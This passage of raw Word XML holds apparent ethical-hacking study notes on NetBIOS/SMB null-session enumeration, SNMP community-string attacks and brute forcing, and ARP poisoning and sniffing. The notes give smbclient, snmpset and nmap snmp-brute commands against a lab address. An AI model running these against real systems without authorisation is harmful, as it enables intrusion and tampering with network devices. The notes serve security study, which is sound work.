    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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&lt;20&gt; means that server file and printer shares available</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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 nbtscan</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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These tools use net nios naming service (NBNS) protocol</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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List shares;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table8"/>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1F1">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Smbclient -l ip</w:t>
                <w:br w:type="textWrapping"/>
                <w:t xml:space="preserve">Sudo mount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.cifs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//ip/drive /media/sharelocal user=,pass=</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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Then enum4linux</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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1u1m3mm9veq" w:id="82"/>
        <w:bookmarkEnd w:id="8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Null Session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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Rely on cifs (common internet file system) and SMB (server message block) to return info to an authenticated user, must be to IPC share</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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smbclient //ip/$IPC “” /local</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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fso3cldpx6c" w:id="83"/>
        <w:bookmarkEnd w:id="8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br w:type="textWrapping"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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fso3cldpx6c" w:id="83"/>
        <w:bookmarkEnd w:id="8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Enumerate NETBios with null sess </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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Winfingerprint</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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Winfo</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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DumpSec</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001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Enum4Linux then → smbclient \\\\ip\\share</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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F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1F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srk7qrn0gtb" w:id="84"/>
        <w:bookmarkEnd w:id="8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Simple Network Management Protocol (SNMP)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F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manage / configure networks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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-Read → monitor devices</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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-Write → configure devices</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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-Trap → trap events from the device and report</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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-Traversal Operations → what device supports</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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UDP Port 161 (general) 162 (trap), agents return a response</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000205">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71ahkl4c39s" w:id="85"/>
        <w:bookmarkEnd w:id="85"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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Have a header → PDU (protocol data units)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000207">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Community String → secure password authentication </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000208">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="27"/>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Private (write) or public (read_)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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MIBS (management information base) → collection of definitions which defines the properties of the managed device ie router kept for the network manager</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Structured in a tree</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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OID → object identifier, beginning of the tree. Managed objects</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020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6zaf5zfnpyh1" w:id="86"/>
        <w:bookmarkEnd w:id="8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 Attacks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table9"/>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Flooding (sending trap messages)</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DOS attack which involves spoofing an SNMP agent and flooding the SNMP trap management with tens of thousands of SNMP traps, varying in size from 50 bytes to 32 kilobytes, until the SNMP management trap is unable to function properly.</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>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Community(using community strings)</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default community strings to gain privileged access to systems.</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:ins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Brute Force(guess community string)</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a tool to guess the community strings used on a system to achieve elevated privileges.</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000213">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ojqwjpkmz8y" w:id="87"/>
        <w:bookmarkEnd w:id="8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Enumerating </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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Obtaining Community strings</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000215">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>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Sniff network traffic, snmp1/2 uses clear text</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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Snmpwalk → queries the MIBS tree with the SNMP Get Next to find OID</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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snmpset→ uses snmp set request to change information on network entity</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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 snmp-brute, snmp-info, snmp-* </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000219">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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Snmp-win32-services (enum)</w:t>
          <w:br w:type="textWrapping"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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1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yai2n4g4cq" w:id="88"/>
        <w:bookmarkEnd w:id="8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NOTES (SNMP Enumeration)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>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information from the target</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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Snmpwalk -v 2c -c public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version 2c</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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Snmpwalk -v -2c -c public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 OID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details for an oid</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021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nmap -sU -p 161 --script snmp-win32-services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default udp port</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000220">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="131"/>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community string</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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nmap -sU -p 161 --script snmp-brute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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000222">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="131"/>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Users</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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nmap -sU -p 161 --script snmp-win32-users ipaddress</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000224">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="131"/>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info on target from info in the prev target</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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Snmpset -v 2c -c public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 oid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value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set oid, and string (s) value </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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2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2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2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2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yd0s5jkd7zj8" w:id="89"/>
        <w:bookmarkEnd w:id="8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@LAB NOTES ( NETBIOS HACKING)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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2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-A 10.130.40.70 -p 139,445</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002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Nmblookup </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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Smbclient -l ip</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022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smbclient //ip/$IPC “” /local</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023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nmap -sU -p 161 --script snmp-brute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ipaddress</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002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nmap -A 10.130.40.70 -p 139,445</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023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mount.cifs //ip/drive /media/sharelocal user=,pass=</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023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LOOKAT:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023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Autoroute</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023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through shell et</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002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3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4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4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4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4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4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hyoet3hmsc0" w:id="90"/>
        <w:bookmarkEnd w:id="9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Sniffing &amp; MITM</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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layer attack</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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Hubs → layer 1 devices that only deal with bits, repeat across all ports. NIC’s read intended mac address and drop frame if not intended.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000247">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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NICS can accepts all traffic (promiscuous mode)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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Switches → Layer 2 devices data(frames, forwarding ruleS)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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5lcyega5nfxg" w:id="91"/>
        <w:bookmarkEnd w:id="91"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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krwpy045aq61" w:id="92"/>
        <w:bookmarkEnd w:id="9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Passive Sniffing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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Watching packets on a network. Gather sensitive data (ids, pass)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024C">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4bcg1qkr0l2" w:id="93"/>
        <w:bookmarkEnd w:id="9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Active Sniffing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024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Performing malicious operations on the network</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024E">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="160" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Trebuchet MS" w:cs="Trebuchet MS" w:eastAsia="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_1iooilujx2j8" w:id="94"/>
        <w:bookmarkEnd w:id="9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MAC FLooding</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11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Stress the switch fills it CAM(forwarding information)Table. Therefore it can learn new mac address, meaning it will forward all frames (like hub).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000250">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Trebuchet MS" w:cs="Trebuchet MS" w:eastAsia="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_sj20kfi47nwk" w:id="95"/>
        <w:bookmarkEnd w:id="9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Poisoning/spoofing (Address Resolution Protocol)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000251">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11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Able to redirect traffic to attack machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000252">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11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 resolve IP address  (Layer 3) to MAC addresses (Layer 2). Uses ARP requests and replies, uses ARP Table (stores pair, ip - mac) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000253">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="110"/>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Each node maintains a table</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000254">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="110"/>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Inserted into protocol frame if in the table for a packet sent</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000255">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="110"/>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not → ARP Request is sent on LAN on broadcast  (ff:ff:ff:ff:ff:ff), reaches all nodes in broadcast domain. If not right IP, node receiving will drop packet. Else → reply</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000256">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11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Gratuitous ARP  → Gratuitous request ( src &amp; dest are set IP of issuing machine, and mac is broadcast). Gratuitous reply ( sent without requested)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000257">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="144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 Poisoning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Attacking Machine sends Gratuitous reply to two hosts communicating, Attacker forwards packets to each host correctly</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000258">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="144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Gateway Poisoning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Sending gratuitous reply to all hosts (or most) , to act as the MAC address for the default gateway for the network.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025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5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6kyq37jbiba" w:id="96"/>
        <w:bookmarkEnd w:id="9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Sniffing Tools</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025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rr78bnvmo6r" w:id="97"/>
        <w:bookmarkEnd w:id="9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Dsniff</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025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Attach to an  interface as root, sniff passwords</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025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con02gc7uy9" w:id="98"/>
        <w:bookmarkEnd w:id="9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Wireshark</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025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Attach to an interface/filtering</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025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4pnl0g77stk3" w:id="99"/>
        <w:bookmarkEnd w:id="9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TCP Dump</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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Intercept packets (TCP)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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Traffic on eth0</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table10"/>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262">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tcpdump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eth0</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000263">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Capture traffic to specific website</w:t>
        </w:r>
      </w:ins>
    </w:p>
